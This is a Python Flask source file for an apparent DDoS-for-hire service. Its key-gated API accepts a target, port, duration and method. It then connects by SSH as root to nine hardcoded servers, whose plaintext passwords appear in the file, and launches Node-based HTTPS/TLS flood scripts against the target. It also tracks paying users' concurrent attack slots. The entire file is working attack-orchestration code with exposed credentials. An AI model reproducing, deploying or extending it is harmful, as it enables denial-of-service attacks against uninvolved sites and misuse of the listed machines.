import paramiko
import threading
import requests

from flask import *
from apscheduler.schedulers.background import BackgroundScheduler
from datetime import datetime

app = Flask(__name__)
scheduler = BackgroundScheduler()
attack_slots = 0
max_slots = 10

ssh_servers = [
    {
        'hostname': '170.187.198.153',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    },
    {
        'hostname': '139.162.5.209',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    },
    {
        'hostname': '170.187.228.61',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    },
    {
        'hostname': '170.187.198.153',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    },
    {
        'hostname': '170.187.197.246',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    },
    {
        'hostname': '170.187.198.153',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    },
    {
        'hostname': '139.144.123.6',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    },
    {
        'hostname': '139.162.8.224',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    },
   {
        'hostname': '172.234.55.162',
        'port': 22,
        'username': 'root',
        'password': 'agungcina25'
    }
]

def get_user_info(key):
    with open('users.txt', 'r') as file:
        for line in file:
            line = line.strip()
            if line.startswith(key):
                user_info = line.split(':')
                if len(user_info) == 4:
                    return int(user_info[2]), int(user_info[3])
        return None, None

def key_exists(key):
    with open('users.txt', 'r') as file:
        for line in file:
            line = line.strip()
            if line.startswith(key + ':'):
                return True
    return False

def remove_expired_keys():
    with open('users.txt', 'r') as file:
        lines = file.readlines()

    with open('users.txt', 'w') as file:
        for line in lines:
            line = line.strip()
            if line:
                key, expired_date, max_duration, max_concurrent = line.split(':')
                if datetime.now() < datetime.strptime(expired_date, '%Y-%m-%d') and int(max_duration) > 0:
                    file.write(line + '\n')

@app.route('/')
def home():
  return "Api Testi"

@app.route('/api')
def execute_command():
    global attack_slots
    key = request.args.get('key')
    target = request.args.get('host')
    port = request.args.get('port')
    duration = request.args.get('time')
    method = request.args.get('method')

    if not all([target, port, duration, method]) or key is None:
        return jsonify({'error': 'Missing required parameters.'}), 400

    if not key_exists(key):
        return jsonify({'error': 'Wrong key.'}), 400

    try:
        duration = int(duration)
    except ValueError:
        return jsonify({'error': 'Invalid duration parameter.'}), 400

    max_duration, max_concurrent = get_user_info(key)
    if max_duration is None or max_concurrent is None:
        return jsonify({'error': 'Invalid user info.'}), 400

    def connect_to_ssh_server(server):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(server['hostname'], port=server['port'], username=server['username'], password=server['password'])
        except paramiko.AuthenticationException:
            print(f"Failed to connect to {server['hostname']} - Authentication failed")
        except paramiko.SSHException as e:
            print(f"Failed to connect to {server['hostname']} - {str(e)}")
        except Exception as e:
            print(f"Error connecting to {server['hostname']} - {str(e)}")
        else:
            if method.upper() == 'HTTPS':
              print(f'Attack to {target} HTTPS')
              command = f"cd /root/methods/layer7/ && screen -dm timeout {duration} node https.js {target} {duration} 8 2"
            elif method.upper() == 'TLS':
              print(f'Attack {target} TLS')
              command = f"cd /root/xyz/ && screen -dm timeout {duration} node tls.js {target} {duration} 64 4 proxy.txt"
            elif method.upper() == 'HTTPSV2':
              print(f'Attack {target} hhtps2')
              command = f"cd /root/methods/layer7/ && screen -dm timeout {duration} node httpsv2.js {target} {duration} 8 2"
            elif method.upper() == 'MIX':
              print(f'Attack {target} mix')
              command = f"cd /root/methods/layer7/ && screen -dm timeout {duration} node mix.js {target} {duration} 8 2"
            elif method.upper() == 'STOP':
              command = f"pkill -f {target}"
            else:
              return jsonify({'error': 'Invalid method parameter.'}), 400
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode('utf-8')
            ssh.close()

    if attack_slots >= max_concurrent:
        return jsonify({'error': f'Your concurrents max is {max_concurrent}'}), 400

    threads = []
    for server in ssh_servers:
        thread = threading.Thread(target=connect_to_ssh_server, args=(server,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    def decrease_slots():
        global attack_slots
        attack_slots -= 1
        app.logger.info(f'Slot decreased. Slots in use: {attack_slots}')
        if attack_slots == 0:
            scheduler.remove_all_jobs()
            app.logger.info('All slots freed.')

    attack_slots += 1
    app.logger.info(f'Attack started on {target}. Slots in use: {attack_slots}')

    app.logger.info(f'Scheduling slot decrease for duration: {duration} seconds')
    scheduler.add_job(decrease_slots, 'interval', seconds=duration)
    slots = f'{attack_slots}/{max_slots}'
    bots = f'{len(threads)}/{len(ssh_servers)}'
    return jsonify({'result': {'Successfull Attack to':
      {'host': f'{target}',
       'port': f'{port}',
       'time': f'{duration}',
       'method': f'{method}',
       'slots': f'{attack_slots}/{max_slots}',
       'server': f'{len(threads)}/{len(ssh_servers)}'}}}), 200


@app.errorhandler(404)
def error_404(e):
    return "404 PAGE NOT FOUND", 404

if __name__ == '__main__':
    scheduler.start()
    remove_expired_keys()
    app.run(host='0.0.0.0', port=8080)
